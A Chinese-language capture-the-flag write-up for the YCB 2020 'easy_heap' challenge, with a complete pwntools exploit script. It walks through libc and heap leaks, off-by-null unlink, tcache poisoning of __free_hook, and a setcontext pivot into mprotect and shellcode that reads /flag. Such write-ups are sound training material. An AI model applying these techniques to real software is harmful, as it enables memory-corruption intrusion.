---
title: YCB_2020_EASY_HEAP writeup
tags: []
id: '308'
categories:
  - - 笔记
abbrlink: ed22203c
date: 2022-08-11 02:39:09
---

## 一、分析

首先查看题目保护：Full Relro，Canary found，NX enabled，PIE enabled

通过IDA查看main函数，程序主体就是一个简单的switch菜单，在while循环之前通过prctl开启了沙箱。使用seccomp-tools可以看到沙箱禁止了execve系统调用，无法使用system('/bin/sh')。因此可能需要通过构造ROP链达到orw读取flag文件。

接着看菜单内部：无法指定新增指针的index，但是此处有个小逻辑：若该index处储存的指针为空，则向这个index处存放下一个申请的指针。但是index指针为什么会空呢，因为在free的时候会将对应指针置空。这么一看似乎把UAF的路给堵死了。但是参考了大佬的方法以后发现，因为malloc以后不会改变chunk中的内容，所以我们可以先free，再malloc，之后就能获取到fd和bk了。

在新增的时候，没有限制chunk的大小，因此这里可以自由使用各种bin attack来进行攻击。其次，存在一个比较明显的off-by-null漏洞，在之后需要利用。

## 二、思路

由于保护全开，所以第一步必须得获取到libc的基地址。这里可以使用unsorted bin leak来进行获取。首先构造一个足够大的chunk，使其在free的时候直接进入unsorted bin而不是tcache bin。接着构造一个小chunk，使其在被free的时候不会合并到top chunk中。然后将chunk 0 free掉，再malloc同样大小的chunk获取到它的指针。接着通过show操作就可以读出fd（即main\_arena附近）的地址了。由于该地址和libc\_base的相对位置是固定的，因此可以通过gdb查看以后直接通过偏移量得到libc\_base。

接着需要得到heap\_base，来构造后面的ROP chain。利用刚刚的chunk 1，再加一个chunk 2，再新建一个chunk 3防止合并，然后将chunk 1和chunk 2依次合并。重新分配一个空间，这个时候由于LIFO，index 1会得到chunk 2的地址。而chunk 2的FD也就是tcache\_next，即chunk 1的地址。根据这个地址和heap\_base的偏移量（固定值）可以算出heap\_base的值。

接着需要利用tcache poisoning实现任意地址写。但是这个技术（参考how2heap中的[示例](https://github.com/shellphish/how2heap/blob/master/glibc_2.27/tcache_poisoning.c)）最好需要有可利用的指针。而本题会对free的chunk进行指针的清空。所以绕个圈子：通过off-by-null实现前向unlink，使得fake chunk被合并，再malloc就会得到这个fake chunk的指针。而这个指针可以在原本的大chunk被free的时候保留下来，从而修改已经被free的大chunk中的内容。

利用刚刚的chunk 1和chunk 2，构造一个fake chunk，然后将chunk 3进行free，令其与fake chunk进行合并，再申请一块内存空间，得到fake chunk的指针。

接着，将**事先准备好的**chunk 5 free掉，然后再free chunk 1。通过chunk 3的指针对tcache\_next进行修改，令其为free\_hook的地址。然后将chunk 1和chunk 5申请回来。此时chunk 5的指针指向free\_hook的地址。对chunk 5（free\_hook）进行修改，令其指向我们需要的gadget。我们需要通过这个gadget来调用setcontext达到修改寄存器的目的，所以找到了这个：

```
# 0x00000000001547a0 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
```

它可以将\[rdi + 8\]处的值赋给rdx，并且call \[rdx + 0x20\]。而在free\_hook运行到gadget的时候，这个rdi恰好是free的指针。所以我们构造chunk 0+8的位置写上chunk 0的地址，chunk 0+20的位置写上setcontext+61的地址。

setcontext会将rdx加上一系列的偏移的地址中的值放到各个寄存器中，包括rsp。所以可以在chunk 0中对应偏移的位置写入对应的值。具体可以见exp中最后一段edit(0)中的注释。接着setcontext函数返回，调用栈进入我在栈中构造的SYS\_mprotect函数，并且已经通过寄存器构造好了相应的参数，使得堆中出现了一块可写的空间。

接着就可以继续通过ret调用堆上写好的shellcode了。由于这里不能用execve，我直接使用shellcraft自带的cat获取/flag。如果不能使用mprotect修改堆的可执行权限，这里也可以通过构造rop链来执行orw。

## 三、exp

```
from pwn import *

context.log_level = "debug"
context.terminal = "kitty"
context.arch = 'amd64'
debug = True

if debug:
    sh = process("./pwn")
    libc = ELF("/home/lqz/pwn/glibc-all-in-one/libs/2.30-0ubuntu2_amd64/libc-2.30.so")
else:
    libc = ELF("/home/lqz/pwn/glibc-all-in-one/libs/2.30-0ubuntu2_amd64/libc-2.30.so")
    ip = "node4.buuoj.cn"
    port = 25335
    sh = remote(ip, port)


def menu(num):
    sh.sendlineafter(b"Choice:", str(num).encode())


def add(size):
    menu(1)
    sh.sendlineafter(b"Size: ", str(size).encode())
    sh.recvline_contains(b"Done!", timeout=0)


def edit(index, content):
    menu(2)
    sh.sendlineafter(b"Index: ", str(index).encode())
    sh.sendafter(b"Content: \n", content)
    sh.recvline_contains(b"Done!", timeout=0)


def dele(index):
    menu(3)
    sh.sendlineafter(b"Index: ", str(index).encode())
    sh.recvline_contains(b"Done!", timeout=0)


def show(index):
    menu(4)
    sh.sendlineafter(b"Index: ", str(index).encode())
    # sh.recvline_contains(b"Don not exist!", timeout=0)
    # Remember to receive Content: and [+]Done!


# Leak Heap
add(0x40F)  # 0
add(0x20)  # 1
add(0x20)  # 2
add(0x4F0)  # 3
add(0x10)  # 4
add(0x20)  # 5
dele(0)
add(0x40F)  # 0
show(0)
sh.recvuntil(b"Content: ")
main_arena = int.from_bytes(sh.recv(0x6), "little")
success("leak_addr(main_arena): " + hex(main_arena))
libc_base = main_arena - 0x70 - libc.sym["__malloc_hook"]
libc.address = libc_base
success("libc_base: " + hex(libc_base))
sh.recvuntil(b"[+]Done!\n")

# gdb.attach(sh)

dele(1)
dele(2)
add(0x28)  # 1
show(1)
sh.recvuntil(b"Content: ")
heap_base = int.from_bytes(sh.recv(0x6), "little") & 0xFFFFFFFFF000
success("heap_base: " + hex(heap_base))
sh.recvuntil(b"[+]Done!\n")
# gdb.attach(sh)

add(0x28)  # 2
edit(1, p64(heap_base+0x6c0)+0x18*b'a'+p64(0x50))
# 0->2->1->3->xxx chunks
edit(2, p64(0)+p64(0x51)+p64(heap_base+0x6f0-0x18)+p64(heap_base+0x6f0-0x10))

# gdb.attach(sh)

dele(3)
add(0x100) # 3
edit(3, flat({0x18:0x31}))

# gdb.attach(sh)

dele(5)
# gdb.attach(sh)
dele(1)
# gdb.attach(sh)

edit(3, flat({0x18:[
    0x31, p64(libc.sym['__free_hook'])[:7]
    ]}))
success("free_hook: "+hex(libc.sym['__free_hook']))
# gdb.attach(sh)
add(0x20) # 1 
add(0x20) # 5 
# 0x00000000001547a0 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
edit(5, p64(libc_base + 0x0000000000154b90))

# gdb.attach(sh)
start_addr = heap_base + 0x2a0
edit(0, flat({
    0: start_addr + 0x100,
    0x8:start_addr,
    0x20: libc.sym['setcontext']+61, # gadget 2
    0xa0: start_addr, # rsp
    0xa8: libc.sym.mprotect, # rcx
    0x68: start_addr & ~0xfff, #rdi / SYS_mprotect_addr
    0x70: 0x4000, # rsi / SYS_mprotect_len
    0x88: 7, # rdx / SYS_mprotect_prot
    0x100: asm(shellcraft.amd64.linux.cat('/flag')),
    }, filler='\x00'))

gdb.attach(sh)

dele(0)


sh.interactive()
```